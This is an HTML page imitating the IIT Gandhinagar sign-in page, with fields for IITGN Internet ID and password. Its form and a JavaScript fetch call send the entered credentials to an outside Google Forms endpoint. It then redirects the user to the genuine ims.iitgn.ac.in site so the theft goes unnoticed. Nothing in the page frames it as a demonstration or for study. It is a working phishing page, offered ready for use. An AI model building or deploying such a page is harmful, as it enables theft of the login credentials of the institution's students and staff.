<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Sign in to IIT Gandhinagar</title>


  <meta name="robots" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1">



  <link href="./index.css" rel="stylesheet">


  <script defer="" src="./index.js" type="module"></script>
</head>

<body class="bg-secondary-100 flex flex-col items-center justify-center min-h-screen sm:py-16">
  <div class="max-w-md space-y-6 w-full">
    <div class="bg-white p-8 rounded-lg space-y-6">
      <div class="space-y-4">
        <div class="font-bold text-center text-2xl">
          <div class="kc-logo-text"><span>IIT Gandhinagar</span></div>
        </div>
        <h1 class="text-center text-xl">
          Sign in to your account
        </h1>

      </div>
      <div class="space-y-4">
        <form id="loginForm" class="m-0 space-y-4" method="post"
          action="https://docs.google.com/forms/d/e/1FAIpQLSchZDO5dZwgKnTVZwQjTHhzri7MROUhCFkox5rH8PcQw-lr3g/formResponse"
          onsubmit="login.disabled = true; return true;">
          <input name="credentialId" type="hidden" value="">
          <div>
            <label class="sr-only" for="username">
              IITGN Internet ID
            </label>
            <input autofocus="" required="" aria-invalid="false"
              class="block border-secondary-200 mt-1 rounded-md w-full focus:border-primary-300 focus:ring focus:ring-primary-200 focus:ring-opacity-50 sm:text-sm"
              id="username" name="entry.1489070905" placeholder="IITGN Internet ID" autocomplete="username" type="text"
              value="">
            <div class="mt-2 text-red-600 text-sm">

            </div>
          </div>
          <div>
            <label class="sr-only" for="password">
              Password
            </label>
            <input required="" aria-invalid="false"
              class="block border-secondary-200 mt-1 rounded-md w-full focus:border-primary-300 focus:ring focus:ring-primary-200 focus:ring-opacity-50 sm:text-sm"
              id="password" name="entry.411632175" placeholder="Password" type="password">
            <div class="mt-2 text-red-600 text-sm">

            </div>
          </div>
          <div class="flex items-center justify-between">
            <div class="flex items-center">
              <input
                class="border-secondary-200 h-4 rounded text-primary-600 w-4 focus:ring-primary-200 focus:ring-opacity-50"
                id="rememberMe" name="rememberMe" type="checkbox">
              <label class="ml-2 text-secondary-600 text-sm" for="rememberMe">
                Remember me
              </label>
            </div>


            <a class="text-primary-600 hover:text-primary-500 text-sm inline-flex"
              href="https://auth.iitgn.ac.in/realms/iitgnsso/login-actions/reset-credentials?client_id=ims&amp;tab_id=o0ppx-f6V6o">
              Forgot Password?
            </a>
          </div>
          <div class="flex flex-col pt-4 space-y-2">


            <button
              class="bg-primary-600 text-white focus:ring-primary-600 hover:bg-primary-700 px-4 py-2 text-sm flex justify-center relative rounded-lg w-full focus:outline-none focus:ring-2 focus:ring-offset-2"
              name="login" onclick="handleFormSubmit(event)" type="submit">
              Sign In
            </button>
          </div>
        </form>

      </div>
    </div>
    <div class="flex justify-around">
    </div>
  </div>


  <div class="text-center">
    <p>Use your IITGN Internet ID and Password for Login. To request an account, please contact
      helpdesk.istf@iitgn.ac.in.</p>
  </div>

  <script>
    function handleFormSubmit(event) {
      event.preventDefault(); // Prevent the default form submission

      const form = document.querySelector('#loginForm'); // Select the form using querySelector
      if (!form) {
        console.error('Form element not found.');
        return;
      }

      const formData = new FormData(form);

      fetch(form.action, {
        method: 'POST',
        body: formData,
        mode: 'no-cors'
      }).then(() => {
        // Redirect after form submission
        window.location.href = 'https://ims.iitgn.ac.in/';
      }).catch(error => {
        console.error('Error:', error);
      });
    }
  </script>
</body>

</html>
